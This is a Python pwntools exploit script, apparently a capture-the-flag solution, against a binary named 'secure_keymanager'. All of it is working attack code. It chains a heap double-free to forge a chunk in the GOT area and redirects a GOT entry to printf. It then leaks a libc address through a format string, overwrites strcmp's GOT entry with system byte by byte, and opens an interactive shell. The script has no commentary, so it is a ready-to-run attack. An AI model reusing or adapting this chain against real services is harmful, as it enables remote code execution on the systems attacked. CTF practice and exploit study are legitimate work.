#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('', )
else:
    r = remote('127.0.0.1', 4444)

code = ELF('./secure_keymanager')
libc = ELF('./bc.so.6')

context.arch = code.arch
context.log_level = 'debug'

def login():
    r.sendafter('>> ', '/bin/sh')
    r.sendafter('>> ', '/bin/sh')

def add(size, key, data=False):
    r.sendlineafter('>> ', '1')
    r.sendafter('...', size)
    r.sendafter('...', key)
    if data != False:
        r.sendafter('...', data)
    r.recvuntil('done')
    
def edit(i, data):
    r.sendlineafter('>> ', '3')
    login()
    r.sendlineafter('...', str(i))
    r.sendlineafter('...', data)

def remove(i):
    r.sendlineafter('>> ', '4')
    login()
    r.sendlineafter('...', str(i))

login()

add('72', 'qwe', 'qwe')
add('72', 'qwe', 'qwe')
remove(0)
remove(1)
remove(0)
add('72', p64(0x602035), 'qwe')
add('72', 'qwe', 'qwe')
add('72', 'qwe', 'qwe')
add('72', '\x7f', flat(
    'A'*11,
    code.plt['printf']
    ))

r.sendlineafter('>> ', '%25$p')
leak = int(r.recvuntil('\n').strip(), 16)
libc.address = leak - 240 - libc.sym['__libc_start_main']

def fmt(src, dst, i):
    dst >>= i*8
    dst &= 0xff
    res = '%{}c'.format((dst+256-16)%256) + '%10$hhn' 
    res = res.ljust(16)
    res += p64(src+i)
    return res

for i in range(8):
    p = fmt(code.got['strcmp'], libc.sym['system'] ,i)
    r.sendlineafter('>> ', 'A'*16 + p + '\x00')

r.sendlineafter('>> ', 'qwe') # printf -> 3 -> edit -> strcmp -> system

r.interactive()
